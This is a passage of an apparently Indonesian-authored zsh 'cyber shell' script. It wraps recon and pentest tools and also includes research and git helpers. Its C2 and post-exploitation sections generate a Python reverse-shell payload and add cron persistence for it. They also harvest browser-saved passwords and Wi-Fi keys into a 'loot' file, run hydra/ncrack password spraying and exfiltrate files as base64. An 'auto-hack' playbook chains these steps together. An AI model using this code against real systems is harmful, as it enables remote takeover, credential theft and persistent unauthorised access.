  command -v nmcli >/dev/null 2>&1 && nmcli -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null | head -11
}

anf_monitor() {
  local iface=${2:-wlan0}; _anf_check_sudo || return 1
  case "$1" in
    on) sudo airmon-ng start "$iface";;
    off) sudo airmon-ng stop "${iface}mon";;
    *) iwconfig 2>/dev/null | grep -i monitor;;
  esac
}

anf_mac() {
  local iface=${2:-wlan0}; _anf_check_sudo || return 1
  case "$1" in
    random) sudo ip link set "$iface" down; sudo macchanger -r "$iface"; sudo ip link set "$iface" up;;
    show) macchanger -s "$iface";;
  esac
}

anf_pilgrims() {
  print "${C_Y}=== PILGRIMS v17 ===${C_0}"
  print "  /pilgrims info | run | web <target>"
  print "  image: ghcr.io/anf/pilgrims-v17:latest"
}

# ---------------------------------------------------------------------
# Network
# ---------------------------------------------------------------------

anf_screenshot() {
  local out="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/screenshots/screen_$(date +%H%M%S).png"
  mkdir -p "$out:h"
  if command -v scrot >/dev/null 2>&1; then scrot "$out" && _anf_log ok "Saved: $out"
  elif command -v gnome-screenshot >/dev/null 2>&1; then gnome-screenshot -f "$out" && _anf_log ok "Saved: $out"
  elif command -v import >/dev/null 2>&1; then import -window root "$out" && _anf_log ok "Saved: $out"
  elif command -v grim >/dev/null 2>&1; then grim "$out" && _anf_log ok "Saved: $out"
  else _anf_log err "No screenshot tool found"; return 1; fi
}

anf_proxy() {
  case "$1" in
    on) export http_proxy="http://127.0.0.1:8080"; export https_proxy="$http_proxy"; _anf_log ok "Proxy ON";;
    off) unset http_proxy https_proxy; _anf_log ok "Proxy OFF";;
    *) _anf_log warn "Usage: /proxy on|off";;
  esac
}

# ---------------------------------------------------------------------
# Utils
# ---------------------------------------------------------------------

anf_uuid() { local n=${1:-1} i; for ((i=0;i<n;i++)); do command -v uuidgen >/dev/null && uuidgen || python3 -c 'import uuid;print(uuid.uuid4())' 2>/dev/null; done; }

anf_random() { local len=${1:-16}; LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$len"; print; }

anf_epoch() {
  if [[ -z "$1" ]]; then print "  Local: $(date)"; print "  UTC: $(date -u)"; else print "  Local: $(date -d "@$1" 2>/dev/null || date -r "$1" 2>/dev/null)"; fi
}

anf_clip() {
  [[ -z "$1" ]] && return 1
  if command -v wl-copy >/dev/null 2>&1; then print -n "$*" | wl-copy
  elif command -v xclip >/dev/null 2>&1; then print -n "$*" | xclip -sel clip
  elif command -v pbcopy >/dev/null 2>&1; then print -n "$*" | pbcopy
  else _anf_log err "Clipboard tool not found"; return 1; fi && _anf_log ok "Copied"
}

# ---------------------------------------------------------------------
# Tools Wrappers
# ---------------------------------------------------------------------

anf_amass() { _anf_has_bin amass || { _anf_log err "amass not installed"; return 1; }; amass "$@"; }

anf_gobuster() { _anf_has_bin gobuster || { _anf_log err "gobuster not installed"; return 1; }; gobuster "$@"; }

anf_nikto() { _anf_has_bin nikto || { _anf_log err "nikto not installed"; return 1; }; nikto "$@"; }

anf_whatweb() { _anf_has_bin whatweb || { _anf_log err "whatweb not installed"; return 1; }; whatweb "$@"; }

anf_hermes_locate() {
  _anf_log info "Mencari 'hermes' di sistem..."
  if _anf_has_bin hermes; then HERMES_BIN="$(_anf_which hermes)"; print -r -- "$HERMES_BIN" > "$_anf_hermes_state"; _anf_log ok "Ditemukan di PATH: $HERMES_BIN"; return 0; fi
  if [[ -d "$HOME/.hermes" ]]; then local hit="$(find "$HOME/.hermes" -maxdepth 3 -type f -perm -u+x 2>/dev/null | head -1)"; if [[ -n "$hit" ]]; then HERMES_BIN="$hit"; print -r -- "$HERMES_BIN" > "$_anf_hermes_state"; _anf_log ok "Ditemukan: $HERMES_BIN"; return 0; fi; fi
  local cand; for cand in ${(@f)$(_anf_hermes_candidates)}; do if [[ -x "$cand" ]]; then HERMES_BIN="$cand"; print -r -- "$HERMES_BIN" > "$_anf_hermes_state"; _anf_log ok "Ditemukan: $HERMES_BIN"; return 0; fi; done
  _anf_log warn "Belum ketemu, cari lebih dalam..."; local found="$(_anf_with_timeout 15 find "$HOME" -maxdepth 6 \( -iname 'hermes' -o -iname 'hermes-agent' \) -type f -perm -u+x 2>/dev/null | head -5)"; if [[ -n "$found" ]]; then print "${C_Y}Kandidat ditemukan:${C_0}"; print -r -- "$found" | nl -ba -w2 -s'  '; print "  ${C_L}set salah satu: /hermes-set <path>${C_0}"; else _anf_log err "Tidak ditemukan. Set manual: /hermes-set <path>"; fi; return 1
}

anf_hermes_set() {
  [[ -z "$1" ]] && { _anf_log warn "Usage: /hermes-set <path>"; return 1; }; local p="${1:A}"; if [[ ! -x "$p" ]]; then _anf_log err "File tidak ada / tidak executable: $1"; return 1; fi; if ! _anf_validate_path "$p"; then _anf_log err "Path harus berada di $HOME, /usr, /opt, atau /snap"; return 1; fi; HERMES_BIN="$p"; print -r -- "$HERMES_BIN" > "$_anf_hermes_state"; _anf_log ok "HERMES_BIN diset: $HERMES_BIN"
}

anf_hermes() {
  if [[ -z "$HERMES_BIN" && -f "$_anf_hermes_state" ]]; then HERMES_BIN="$(cat "$_anf_hermes_state" 2>/dev/null)"; fi
  if [[ -z "$HERMES_BIN" || ! -x "$HERMES_BIN" ]]; then anf_hermes_locate || { _anf_log err "Jalankan /hermes-set <path>"; return 1; }; fi
  local hermes_dir="$(dirname "$HERMES_BIN")"
  if [[ -f "$hermes_dir/../hermes_env/bin/activate" ]]; then ( cd "$hermes_dir/.." && source hermes_env/bin/activate && "$HERMES_BIN" "$@" )
  elif [[ -f "$hermes_dir/hermes_env/bin/activate" ]]; then ( cd "$hermes_dir" && source hermes_env/bin/activate && "$HERMES_BIN" "$@" )
  else "$HERMES_BIN" "$@"; fi
}

anf_github() {
  if ! command -v gh >/dev/null 2>&1; then _anf_log err "GitHub CLI (gh) belum terpasang."; _anf_log info "Coba: /install gh"; return 1; fi; gh "$@"
}

# ---------------------------------------------------------------------
# C2 Framework
# ---------------------------------------------------------------------

anf_c2_payload() {
  local target="${1:-$T}" port="${2:-4444}"; [[ -z "$target" ]] && { _anf_log err "Set IP target (contoh: /c2-payload <IP> <port>)"; return 1; }
  local ip="$(_anf_resolve_host "$target")" || { _anf_log err "Cannot resolve $target"; return 1; }
  local outfile="$AF_C2_DIR/payloads/payload_$(date +%H%M%S).py"
  cat > "$outfile" << EOF
#!/usr/bin/env python3
import socket, subprocess, os, sys, threading, time
def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("$ip", $port))
        while True:
            data = s.recv(1024)
            if not data: break
            if data.startswith(b"exit"): break
            proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            out, err = proc.communicate()
            s.send((out + err).encode() + b"\n")
    except: pass
    finally: s.close()
if __name__ == "__main__": main()
EOF
  chmod +x "$outfile"; _anf_log ok "Payload created: $outfile"; _anf_log info "Kirim ke target dan jalankan: python3 $outfile"
}

anf_c2_interact() {
  local sid="$1"; [[ -z "$sid" ]] && { _anf_log err "Usage: /c2-interact <session_id>"; return 1; }
  local addr=$(jq -r ".\"$sid\".addr" "$AF_C2_SESSION_FILE" 2>/dev/null); if [[ -z "$addr" || "$addr" == "null" ]]; then _anf_log err "Session $sid tidak ditemukan"; return 1; fi
  local ip=${addr%:*}; local port=${addr#*:}; _anf_log info "Connecting to $ip:$port via nc (manual interact)..."; print "${C_Y}Type commands directly. Type 'exit' to close.${C_0}"; nc -nv "$ip" "$port"
}

anf_c2_exfil() { local sid="$1"; local remote_file="$2"; local local_name="${3:-$(basename $remote_file)}"; _anf_log warn "Pastikan agent menjalankan: base64 -w0 $remote_file"; _anf_log info "Setelah menerima base64 di session, jalankan: /c2-decode <paste>"; }

anf_c2_decode() { local data="$1"; [[ -z "$data" ]] && return 1; local out; out="$(mktemp "${TMPDIR:-/tmp}/anf-exfil-XXXXXX.bin")" || return 1; echo "$data" | base64 -d > "$out"; _anf_log ok "File saved to $out"; }

# ---------------------------------------------------------------------
# OSINT MODULES
# ---------------------------------------------------------------------

anf_osint_phone() {
  local phone="$1"; [[ -z "$phone" ]] && { _anf_log err "Usage: /osint-phone <phone>"; return 1; }
  local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/osint_phone_${phone}_$(date +%Y%m%d).txt"
  mkdir -p "$outfile:h"
  if [[ -n "$NUMVERIFY_API_KEY" ]]; then curl -s "http://apilayer.net/api/validate?access_key=$NUMVERIFY_API_KEY&number=$phone&format=1" | jq '.' >> "$outfile"; else _anf_log warn "NUMVERIFY_API_KEY not set"; fi
  _anf_log ok "Phone OSINT saved to $outfile"
}

anf_cloud_enum() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "Usage: /cloud-enum <target>"; return 1; }
  local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/cloud_enum_${target}_$(date +%Y%m%d).txt"
  mkdir -p "$outfile:h"
  for bucket in "${target}" "www.${target}" "s3-${target}" "${target}-backup" "${target}-logs"; do if curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com" | grep -q 200; then print "Public S3 bucket found: https://${bucket}.s3.amazonaws.com" >> "$outfile"; fi; done
  for sub in "${target}" "www" "static" "cdn"; do if curl -s -o /dev/null -w "%{http_code}" "https://${sub}.blob.core.windows.net" | grep -q 200; then print "Azure blob found: https://${sub}.blob.core.windows.net" >> "$outfile"; fi; done
  _anf_log ok "Cloud enum saved to $outfile"
}

anf_wayback() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "Usage: /wayback <target>"; return 1; }
  local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/wayback_${target}_$(date +%Y%m%d).txt"
  mkdir -p "$outfile:h"
  curl -s "http://web.archive.org/cdx/search/cdx?url=*.$target/*&output=json&fl=original&collapse=urlkey" | jq -r '.[1:][]' 2>/dev/null | sort -u > "$outfile"
  _anf_log ok "Wayback URLs saved to $outfile (count: $(wc -l < "$outfile"))"
}

# ---------------------------------------------------------------------
# EXPLOITATION MODULES
# ---------------------------------------------------------------------

anf_priv_esc() {
  [[ -z "$T" ]] && { _anf_log err "No target set"; return 1; }
  if [[ "$(uname)" == "Linux" ]]; then
    if command -v linpeas >/dev/null 2>&1; then linpeas | tee "$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/priv_esc_$(date +%Y%m%d).txt"; else _anf_log warn "linpeas not installed"; fi
  else _anf_log warn "Not implemented for this OS"; fi
}

anf_password_spray() {
  local target=${1:-$T} service=${2:-ssh} userlist=${3:-"$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/users.txt"} passlist=${4:-"$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/passwords.txt"}
  [[ -z "$target" ]] && { _anf_log err "Usage: /password-spray <target> [service] [userlist] [passlist]"; return 1; }
  if [[ "$service" == "ssh" ]]; then command -v hydra >/dev/null 2>&1 && hydra -L "$userlist" -P "$passlist" -t 4 "$target" ssh || _anf_log err "hydra not installed"
  elif [[ "$service" == "rdp" ]]; then command -v ncrack >/dev/null 2>&1 && ncrack -U "$userlist" -P "$passlist" "$target":3389 || _anf_log err "ncrack not installed"
  else _anf_log err "Service $service not supported"; fi
}

# ---------------------------------------------------------------------
# PIVOTING
# ---------------------------------------------------------------------

anf_pivot_socks() {
  local port=${1:-1080}; _anf_validate_port "$port" || { _anf_log err "Invalid port"; return 1; }
  [[ -z "$T" ]] && { _anf_log err "Target not set"; return 1; }
  command -v ssh >/dev/null 2>&1 && { ssh -D "$port" -N -f "$T" && _anf_log ok "SOCKS5 proxy on 127.0.0.1:$port"; } || _anf_log err "ssh not available"
}

anf_port_forward() {
  local remote_port=${1}; local local_port=${2}; [[ -z "$remote_port" || -z "$local_port" ]] && { _anf_log err "Usage: /port-forward <remote_port> <local_port>"; return 1; }
  [[ -z "$T" ]] && { _anf_log err "Target not set"; return 1; }
  command -v ssh >/dev/null 2>&1 && { ssh -L "$local_port:127.0.0.1:$remote_port" -N -f "$T" && _anf_log ok "Forwarding established"; } || _anf_log err "ssh not available"
}

anf_ssh_tunnel() {
  local user=${1}; local host=${2:-$T}; local port=${3:-22}; [[ -z "$user" || -z "$host" ]] && { _anf_log err "Usage: /ssh-tunnel <user> [host] [port]"; return 1; }
  ssh -R 2222:localhost:22 "$user@$host" -p "$port"
}

# ---------------------------------------------------------------------
# DEFENSE MODULES
# ---------------------------------------------------------------------

anf_honeypot() {
  local ports=("${@:-22 23 80 443 8080 3389}"); _anf_check_sudo || return 1
  for p in "${ports[@]}"; do if ! nc -z -w1 127.0.0.1 "$p" 2>/dev/null; then sudo nc -lvkp "$p" -e /bin/false 2>/dev/null & _anf_log info "Honeypot listening on port $p"; fi; done
  _anf_log ok "Honeypots active on ports: $ports"
}

anf_wazuh_agent() { command -v systemctl >/dev/null 2>&1 && sudo systemctl status wazuh-agent | head -5 || _anf_log err "systemctl not found"; }

# ---------------------------------------------------------------------
# POST-EXPLOITATION
# ---------------------------------------------------------------------

anf_persist() {
  [[ -z "$T" ]] && { _anf_log err "Target not set"; return 1; }
  if [[ "$(uname)" == "Linux" ]]; then (crontab -l 2>/dev/null; echo "@reboot python3 $ANF_CACHE_DIR/c2/payloads/*.py") | crontab -; _anf_log ok "Cron persistence added"; else _anf_log warn "Not implemented for this OS"; fi
}

anf_credentials() {
  [[ -z "$T" ]] && { _anf_log err "Target not set"; return 1; }
  local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/loot/credentials_$(date +%Y%m%d).txt"
  mkdir -p "$outfile:h"
  if [[ -d "$HOME/.mozilla/firefox" ]]; then find "$HOME/.mozilla/firefox" -name "logins.json" -exec cat {} \; > "$outfile"; fi
  if [[ -d "$HOME/.config/google-chrome" ]]; then find "$HOME/.config/google-chrome" -name "Login Data" -exec strings {} \; >> "$outfile"; fi
  if [[ -f "/etc/NetworkManager/system-connections" ]]; then sudo grep -r "psk=" /etc/NetworkManager/system-connections/ >> "$outfile"; fi
  _anf_log ok "Credentials saved to $outfile"
}

anf_screenshot_all() {
  [[ -z "$T" ]] && { _anf_log err "Target not set"; return 1; }
  local out="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/screenshots/remote_$(date +%H%M%S).png"
  if command -v scrot >/dev/null 2>&1; then scrot "$out" && _anf_log ok "Screenshot saved"; elif command -v gnome-screenshot >/dev/null; then gnome-screenshot -f "$out"; else _anf_log err "No screenshot tool"; fi
}

anf_clear_logs() {
  [[ -z "$T" ]] && { _anf_log err "Target not set"; return 1; }
  _anf_log warn "Clearing logs on $T (simulated)..."; print > "$ANF_CACHE_DIR/logs/anf-cyber.log"; print > "$AF_LOG_FILE"; _anf_log ok "Logs cleared locally"
}

# ---------------------------------------------------------------------
# REPORTING & PLAYBOOK
# ---------------------------------------------------------------------

anf_playbook() {
  local name="$1"
  case "$name" in
    full-recon) _anf_log info "Running full recon playbook..."; anf_set_target "$T"; anf_subdomains "$T"; anf_scan "$T"; anf_wayback "$T"; anf_cloud_enum "$T"; anf_report ;;
    auto-hack) _anf_log info "Running auto-hack playbook..."; anf_set_target "$T"; anf_autopwn "$T"; anf_priv_esc "$T"; anf_credentials "$T"; anf_report ;;
    defense) _anf_log info "Running defense playbook..."; anf_suricata; anf_honeypot 22 443 3389; anf_yara_scan "$HOME" ;;
    *) _anf_log err "Usage: /playbook <full-recon|auto-hack|defense>"; return 1 ;;
  esac
}

# ---------------------------------------------------------------------
# AI ASSIST
# ---------------------------------------------------------------------

anf_ai_assist() {
  local query="$*"; [[ -z "$query" ]] && { _anf_log err "Usage: /ai-assist <your question>"; return 1; }
  _anf_log info "Asking AI: $query..."
  if command -v ollama >/dev/null 2>&1; then ollama run llama3 "$query" 2>/dev/null
  elif [[ -n "$OPENAI_API_KEY" ]]; then
    curl -s https://api.openai.com/v1/chat/completions \
      -H "Authorization: Bearer $OPENAI_API_KEY" -H "Content-Type: application/json" \
      -d "{\"model\":\"gpt-4o-mini\",\"messages\":[{\"role\":\"user\",\"content\":\"$query\"}]}" | jq -r '.choices[0].message.content'
  else _anf_log err "No AI backend available (install ollama or set OPENAI_API_KEY)"; fi
}

anf_ai_log() {
  local logfile="$1"; [[ -z "$logfile" ]] && { _anf_log err "Usage: /ai-log <logfile>"; return 1; }
  [[ ! -f "$logfile" ]] && { _anf_log err "File not found"; return 1; }
  local content=$(tail -100 "$logfile"); anf_ai_assist "Summarize this log and suggest fixes: $content"
}

# ---------------------------------------------------------------------
# SYSINFO
# ---------------------------------------------------------------------

anf_selftest() {
  print "${C_Y}=== SELF-TEST ===${C_0}"
  local pass=0 fail=0
  _t() { local name="$1" cmd="$2"; eval "$cmd" >/dev/null 2>&1 && { pass=$((pass+1)); _anf_log ok "$name"; } || { fail=$((fail+1)); _anf_log err "$name"; }; }
  _t "set-target"          'anf_set_target test.example.com'
  _t "target stored"       '[[ "$T" == "test.example.com" ]]'
  _t "reset-target"        'anf_reset_target'
  _t "encode base64"       '[[ "$(anf_encode test)" == "dGVzdA==" ]]'
  _t "decode base64"       '[[ "$(anf_decode dGVzdA==)" == "test" ]]'
  _t "hash md5"            '[[ "$(anf_hash test)" == *098f6bcd* ]]'
  _t "uuid gen"            '[[ "${#$(anf_uuid 1)}" -eq 36 ]]'
  _t "random str"          '[[ "${#$(anf_random 10)}" -eq 10 ]]'
  _t "check-ip"            'anf_check_ip'
  _t "workspace"           'anf_workspace test-ws'
  _t "note"                'anf_note selftest'
  _t "tool curl"           'command -v curl'
  _t "tool nmap"           'command -v nmap'
  _t "tool subfinder"      'command -v subfinder'
  _t "tool python3"        'command -v python3'
  _t "tool jq"             'command -v jq'
  print ""; print "  ${C_G}PASS: $pass${C_0}  ${C_R}FAIL: $fail${C_0}"
  [[ $fail -eq 0 ]] && _anf_log ok "All systems operational" || _anf_log warn "Some tests failed"
}

# ---------------------------------------------------------------------
# COMMAND REGISTRATION & HELP
# ---------------------------------------------------------------------

anf_autopwn() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "Usage: /autopwn <target>"; return 1; }
  local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/autopwn_${target}_$(date +%Y%m%d).txt"
  mkdir -p "$outfile:h"
  local ports=$(nmap -p- --min-rate 1000 -T4 "$target" 2>/dev/null | grep open | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
  if [[ -z "$ports" ]]; then _anf_log warn "No open ports found"; return 1; fi
  print "Open ports: $ports" >> "$outfile"
  if command -v msfconsole >/dev/null 2>&1; then _anf_log info "Running Metasploit auxiliary scanner..."; msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; set PORTS $ports; run; exit" >> "$outfile" 2>&1; else _anf_log warn "msfconsole not installed"; fi
  if command -v nuclei >/dev/null 2>&1; then _anf_log info "Running Nuclei vulnerability scan..."; nuclei -target "$target" -severity critical,high -silent >> "$outfile"; fi
  _anf_log ok "AutoPwn results saved to $outfile"
}

anf_osint_email() {
  local email="$1"; [[ -z "$email" ]] && { _anf_log err "Usage: /osint-email <email>"; return 1; }
  local outfile="$ANF_CACHE_DIR/workspaces/${ANF_WS:-general}/scans/osint_email_${email}_$(date +%Y%m%d).txt"
  mkdir -p "$outfile:h"
  if command -v holehe >/dev/null 2>&1; then holehe --no-color "$email" | tee -a "$outfile"; else _anf_log warn "holehe not installed"; fi
  if [[ -n "$HUNTER_API_KEY" ]]; then curl -s "https://api.hunter.io/v2/email-verifier?email=$email&api_key=$HUNTER_API_KEY" | jq '.' >> "$outfile"; else _anf_log warn "HUNTER_API_KEY not set"; fi
  _anf_log ok "OSINT saved to $outfile"
}

anf_sysinfo() {
  local file="informasi_laptop_$(date +%Y%m%d_%H%M%S).txt"
  print -r -- "⏳ Mengumpulkan semua info ke: $file (tunggu sebentar)"
  {
    print "==========================================================="; print "              INFORMASI LAPTOP LENGKAP"; print "==========================================================="
    print "Tanggal & Waktu  : $(date)"; print "Hostname         : $(hostname)"; print "User Saat Ini    : $(whoami)"; print ""
    print "==================== 1. OS & KERNEL ===================="; uname -a; print ""; cat /etc/os-release 2>/dev/null || print "Tidak ada /etc/os-release"; print ""
    print "==================== 2. CPU, RAM, MOTHERBOARD ===================="; command -v lscpu >/dev/null && lscpu || print "lscpu tidak tersedia"; print ""; command -v free >/dev/null && free -h || print "free tidak tersedia"; print ""; if command -v dmidecode >/dev/null && _anf_check_sudo; then sudo dmidecode -t system 2>/dev/null || print "Gagal membaca dmidecode"; else print "dmidecode tidak tersedia atau sudo tidak tersedia"; fi; print ""
    print "==================== 3. DISK, PARTISI, MOUNT ===================="; command -v lsblk >/dev/null && lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT,LABEL,MODEL || print "lsblk tidak tersedia"; print ""; command -v df >/dev/null && df -h || print "df tidak tersedia"; print ""
    print "==================== 4. PCI, USB, & NETWORK ===================="; print "--- PCI Devices ---"; command -v lspci >/dev/null && lspci -nnk || print "lspci tidak tersedia"; print ""; print "--- USB Devices ---"; command -v lsusb >/dev/null && lsusb -t || print "lsusb tidak tersedia"; print ""; print "--- Network Interfaces ---"; command -v ip >/dev/null && ip a || print "ip tidak tersedia"; print ""
    print "==================== 5. MODUL KERNEL ===================="; command -v lsmod >/dev/null && lsmod || print "lsmod tidak tersedia"; print ""
    print "==================== 6. APLIKASI TERINSTAL (PAKET) ===================="
    if command -v dpkg >/dev/null; then print ">>> Debian/Ubuntu (APT) <<<"; dpkg --get-selections | grep -v deinstall; print ""; print "--- Repository ---"; cat /etc/apt/sources.list 2>/dev/null | grep -v "^#" || print "sources.list tidak ada"; cat /etc/apt/sources.list.d/*.list 2>/dev/null | grep -v "^#" || print "Tidak ada sources.list.d tambahan"
    elif command -v pacman >/dev/null; then print ">>> Arch Linux (PACMAN) <<<"; pacman -Qqe; print ""; pacman -Qqm 2>/dev/null || print "Tidak ada AUR"
    elif command -v dnf >/dev/null; then print ">>> Fedora/RHEL (DNF) <<<"; dnf list installed
    elif command -v yum >/dev/null; then print ">>> CentOS/RHEL (YUM) <<<"; yum list installed
    else print "!!! Manajer paket tidak terdeteksi !!!"; fi; print ""
    print "==================== 7. FLATPAK ===================="; command -v flatpak >/dev/null && flatpak list || print "Flatpak tidak terinstal"; print ""
    print "==================== 8. SERVICE SYSTEMD ===================="; if command -v systemctl >/dev/null; then print "--- Enabled services ---"; systemctl list-unit-files --state=enabled --no-pager; print ""; print "--- Running services ---"; systemctl list-units --state=running --no-pager; else print "systemctl tidak tersedia"; fi; print ""
    print "==================== 9. ZONA WAKTU ===================="; command -v timedatectl >/dev/null && timedatectl || print "timedatectl tidak tersedia"; print ""
    print "==================== 10. ENVIRONMENT VARIABLES ===================="; env | sort; print ""
    print "==================== 11. USER & GRUP ===================="; id; print ""; getent passwd | head -10 2>/dev/null || print "getent tidak tersedia"
    print "==========================================================="; print "                    PROSES SCAN SELESAI"; print "==========================================================="
  } > "$file" 2>&1
  print "✅ SUKSES! File laporan:"; ls -lh "$file"; print ""; print "📂 Baca dengan: less $file  atau  cat $file"; print "💾 Simpan file ini ke USB/Cloud sebelum instal ulang!"
}

# ---------------------------------------------------------------------
# SELF-TEST
# ---------------------------------------------------------------------


# ==============================================================================
# SECTION — Research Suite (merged from ANF Research Shell, source FROZEN untouched)
# ==============================================================================
export ANF_RESEARCH_DIR="${ANF_RESEARCH_DIR:-$HOME/Documents/ANF-Cyber-Shell/research/outputs}"
export ANF_SEED="${ANF_SEED:-42}"
typeset -ga _ANF_REQUIRED_TOOLS=(
    "git:git:git:git:git:1"
    "tmux:tmux:tmux:tmux:tmux:1"
    "curl:curl:curl:curl:curl:1"
    "wget:wget:wget:wget:wget:1"
    "python3:python3:python3:python3:python3:1"
    "btop:btop:btop:btop:btop:0"
    "jq:jq:jq:jq:jq:0"
    "ripgrep:ripgrep:ripgrep:ripgrep:ripgrep:0"
    "nmap:nmap:nmap:nmap:nmap:0"
)

# -----------------------------------------------------------------------------
anf_why() {
    print "${C_M}── ANF RESEARCH SHELL — Integrated & Reproducible Research Workbench ──${C_0}"
    print ""
    print "${BOLD}Positioning: semua pekerjaan peneliti (science, math, computer science) dalam satu terminal yang reproducible.${C_0}"
    print ""
    print "${C_G}Science & Math${C_0}     — /stat /calc /sym /plot (statistik, kalkulasi, simbolik, visualisasi)"
    print "${C_G}ML / DL / Eval${C_0}    — /mlinfo /mlbench /dlcheck /sha /exp /csv /bib /paperstat /dataset"
    print "${C_G}Reproducible${C_0}      — seed deterministik, manifest, 25-test, output ke research/outputs/"
    print "${C_G}Rapi & Self-contained${C_0} — /ensure auto-install tool Linux, installer, git, docs"
    print ""
    print "${C_T}Berbeda dari terminal lain: bukan sekadar shell — ini workbench riset yang hasilnya terukur dan tertelusur.${C_0}"
    print ""
}

# -----------------------------------------------------------------------------
# /gen — AI-assisted code generation (via Hermes/opencode bila ada)
# /gen <prompt>     -> celah: generate draft kode dari deskripsi
# -----------------------------------------------------------------------------
anf_gen() {
    local prompt="${*:-}"
    if [[ -z "$prompt" ]]; then
        _anf_log warn "Usage: /gen <deskripsi kode yang mau dibuat>"
        return 1
    fi
    if _anf_has_bin hermes; then
        _anf_log info "Memanggil hermes untuk: $prompt"
        anf_hermes "$prompt"
        return $?
    fi
    if command -v opencode >/dev/null 2>&1; then
        _anf_log info "Memanggil opencode untuk: $prompt"
        opencode "$prompt"
        return $?
    fi
    _anf_log err "Tidak ada AI CLI (hermes/opencode) di PATH. Install salah satunya."
    return 1
}

# -----------------------------------------------------------------------------
# /task — orchestrator: jalankan task di tmux session latar (survive restart)
# /task start <nama> "<cmd>"  /task list  /task attach <nama>
# -----------------------------------------------------------------------------
anf_task() {
    local action="${1:-}"; shift 2>/dev/null
    case "$action" in
        start)
            local name="${1:-task}"; shift
            local cmd="$*"
            if [[ -z "$cmd" ]]; then _anf_log warn "Usage: /task start <nama> \"<cmd>\""; return 1; fi
            if ! command -v tmux >/dev/null 2>&1; then _anf_log err "tmux tidak ada (sudo apt install tmux)"; return 1; fi
            if tmux has-session -t "$name" 2>/dev/null; then
                _anf_log warn "Session $name sudah ada — attach saja."
                tmux attach-session -t "$name" 2>/dev/null
                return 0
            fi
            tmux new-session -d -s "$name" "$cmd"
            _anf_log ok "Task '$name' jalan di tmux (survive restart). Attach: /task attach $name"
            ;;
        list)
            tmux ls 2>/dev/null || _anf_log info "Tidak ada session tmux"
            ;;
        attach)
            local name="${1:-}"
            [[ -z "$name" ]] && { _anf_log warn "Usage: /task attach <nama>"; return 1; }
            tmux attach-session -t "$name" 2>/dev/null || _anf_log err "Session $name tidak ada"
            ;;
        kill)
            local name="${1:-}"
            [[ -z "$name" ]] && { _anf_log warn "Usage: /task kill <nama>"; return 1; }
            tmux kill-session -t "$name" 2>/dev/null && _anf_log ok "Session $name ditutup" \
                || _anf_log err "Gagal tutup $name"
            ;;
        *) _anf_log warn "Usage: /task [start|list|attach|kill]"; return 1;;
    esac
}

# -----------------------------------------------------------------------------
# /q — pencarian cepat dalam project (grep + tree + file)
# /q <pattern> [dir]   -> grep -rn, warnai, skip .git/node_modules
# -----------------------------------------------------------------------------
anf_q() {
    local pattern="${1:-}"; local dir="${2:-.}"
    if [[ -z "$pattern" ]]; then _anf_log warn "Usage: /q <pattern> [dir]"; return 1; fi
    if [[ ! -d "$dir" ]]; then _anf_log err "Dir tidak ada: $dir"; return 1; fi
    command grep -rn --color=always --exclude-dir=.git --exclude-dir=node_modules \
        --exclude-dir=venv --exclude-dir=.venv --exclude-dir=__pycache__ \
        "$pattern" "$dir" 2>/dev/null | head -50 || _anf_log info "Tidak ada match"
}

# -----------------------------------------------------------------------------
# /gitx — git quick-ops harian
# /gitx s (status) | a (add-all) | c <msg> (commit) | l (log) | b (branch) | p (pull)
# -----------------------------------------------------------------------------
anf_gitx() {
    local op="${1:-s}"
    case "$op" in
        s) git status -sb 2>&1 ;;
        a) git add -A && echo "staged" ;;
        c) shift; git commit -m "$*" 2>&1 ;;
        l) git log --oneline -15 2>&1 ;;
        b) git branch -a 2>&1 ;;
        p) git pull --ff-only 2>&1 ;;
        d) git diff --stat 2>&1 ;;
        x) git add -A && git commit -m "wip: $(date +%Y%m%d_%H%M)" 2>&1 && echo "committed wip" ;;
        *) _anf_log warn "Usage: /gitx [s|a|c <msg>|l|b|p|d|x]"; return 1;;
    esac
}

# -----------------------------------------------------------------------------
# /envcard — ringkasan environment/system dalam sekali lihat
# -----------------------------------------------------------------------------
anf_envcard() {
    print "${C_M}── OS ──${C_0}";     uname -srm
    print "${C_M}── Uptime ──${C_0}"; uptime | sed 's/^ *//'
    print "${C_M}── Disk root ──${C_0}"; df -h / | tail -1 | awk '{print "  used "$3" of "$2" ("$5")"}'
    print "${C_M}── Mem ──${C_0}";     free -h | awk '/Mem:/{print "  used "$3" of "$2" ("$3/$2")"}'
    print "${C_M}── Tools ──${C_0}"
    local t; local -a tools=(git tmux docker python3 node hermes opencode)
    for t in "${tools[@]}"; do
        if command -v "$t" >/dev/null 2>&1; then print "  ✓ $t"; else print "  ✗ $t (tidak ada)"; fi
    done
}

# -----------------------------------------------------------------------------
# /mvp — multi-version & branch mgmt
# /mvp (tag current) | v (versi shell) | b <name> (branch baru) | s <name> (switch)
# -----------------------------------------------------------------------------
anf_mvp() {
    local op="${1:-}"; shift 2>/dev/null
    case "$op" in
        tag) local t="${1:-v$(date +%Y%m%d)}"; git tag "$t" 2>&1 && echo "tagged $t" ;;
        v)   echo "ANF_VERSION=$ANF_VERSION (zsh $ZSH_VERSION)" ;;
        b)   git checkout -b "$1" 2>&1 ;;
        s)   git checkout "$1" 2>&1 ;;
